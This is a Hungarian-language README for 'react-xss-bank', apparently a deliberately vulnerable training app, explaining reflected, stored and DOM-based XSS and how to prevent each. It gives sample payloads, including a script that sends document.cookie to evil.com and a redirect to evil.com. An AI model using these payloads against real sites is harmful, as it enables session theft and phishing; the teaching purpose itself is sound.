# react-xss-bank

XSS Sebezhetőségek Kihasználása és Megelőzése
Bevezetés
A Cross-Site Scripting (XSS) egy webes biztonsági sebezhetőség, amely lehetővé teszi a támadók számára, hogy rosszindulatú szkripteket futtassanak a felhasználók böngészőjében. Az XSS támadások célja lehet adatlopás, felhasználói fiókok eltérítése, vagy kártékony kódok végrehajtása. Három fő típusa van:
1.	Reflected XSS (visszatükrözött támadás)
2.	Stored XSS (tárolt támadás)
3.	DOM-Based XSS (DOM-alapú támadás)
Ebben az útmutatóban bemutatjuk, hogyan lehet kihasználni ezeket a sebezhetőségeket, majd megmutatjuk, hogyan lehet hatékonyan védekezni ellenük.
________________________________________
Reflected XSS (Visszatükrözött XSS)
Hogyan lehet kihasználni?
1.	Nyisd meg az oldalt, ahol a "Befizetés" mező található.
2.	Írd be a következő szkriptet a mezőbe: 
3.	<script>alert('Hacked!')</script>
4.	Kattints a "Befizetés" gombra.
5.	A szkript lefut, és megjelenik egy felugró ablak (alert box).
Miért működik?
•	A böngésző visszatükrözi a felhasználói bemenetet anélkül, hogy megtisztítaná azt.
•	A támadó egy linket küldhet az áldozatnak, amely tartalmazza a rosszindulatú szkriptet.
Példa egy támadó URL-re:
https://bankoldal.hu/deposit?amount=<script>alert('Hacked!')</script>
Ha az oldal beilleszti a bemenetet HTML kódba anélkül, hogy megfelelően megtisztítaná, a böngésző végrehajtja a szkriptet.
________________________________________
Stored XSS (Tárolt XSS)
Hogyan lehet kihasználni?
1.	Menj a "Megjegyzések" szekcióhoz.
2.	Írd be a következő kódot egy új megjegyzésként: 
3.	<script>alert('Tárolt XSS!')</script>
4.	Kattints a "Küldés" gombra.
5.	Frissítsd az oldalt – az alert box újra megjelenik!
Miért működik?
•	Az alkalmazás elmenti a megjegyzést localStorage-ban vagy adatbázisban.
•	A böngésző az oldal újratöltése után automatikusan végrehajtja a tárolt kódot.
•	A támadó beágyazhat egy keylogger szkriptet vagy ellophatja a sütiket.
Haladó támadás: Cookie-lopás
<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>
Ezzel a támadó elküldheti az áldozat böngészőjének sütiadatait egy külső szerverre.
________________________________________
DOM-Based XSS (DOM-alapú XSS)
Hogyan lehet kihasználni?
1.	Menj a "Tranzakció keresés" mezőhöz.
2.	Írd be ezt: 
3.	<img src=x onerror=alert('DOM XSS!')>
4.	Ahogy begépeled, a JavaScript azonnal lefut, és egy felugró ablak jelenik meg.
Miért működik?
•	Az oldal JavaScript kódja módosítja a DOM-ot (innerHTML-t használ), ami végrehajtja a szkriptet.
•	A támadó így egy űrlap vagy URL manipulálásával XSS támadást indíthat.
Haladó támadás: Redirect
<script>window.location='http://evil.com'</script>
Ez átirányítja az áldozatot egy adathalász oldalra.
________________________________________
Hogyan lehet védekezni az XSS támadások ellen?
Reflected XSS megelőzése:
Soha ne jelenítsd meg közvetlenül a felhasználói bemenetet!
Használj paraméterezett kimenetet és HTML escaping-et:
setMessage(`Sikeres befizetés: ${encodeURIComponent(amount)} Ft!`);
Stored XSS megelőzése:
Mielőtt adatbázisba vagy localStorage-be mented a bemenetet, tisztítsd meg DOMPurify segítségével:
const safeComment = DOMPurify.sanitize(userInput);
Ne engedd, hogy a böngésző futtasson beágyazott JavaScript-et megjelenítéskor.
DOM-Based XSS megelőzése:
Ne használd az innerHTML-t!
Használj textContent-et a DOM manipulációhoz:
document.getElementById("searchResults").textContent = "Keresési kulcsszó: " + userInput;
Használj tartalomszűrőt, például Content Security Policy (CSP) fejléceket:
Content-Security-Policy: default-src 'self'; script-src 'self'
________________________________________
Összegzés
•	XSS támadások során a támadók rosszindulatú szkripteket futtatnak a felhasználó böngészőjében.
•	Három fő típusa van: Reflected, Stored és DOM-Based XSS.
•	Védekezés: HTML escaping, DOMPurify, textContent, CSP, és biztonságos adatkezelés.
Ezzel az útmutatóval megtanulhatod, hogyan tesztelj XSS sebezhetőségeket egy biztonságos környezetben, és hogyan védd meg a webalkalmazásaidat.
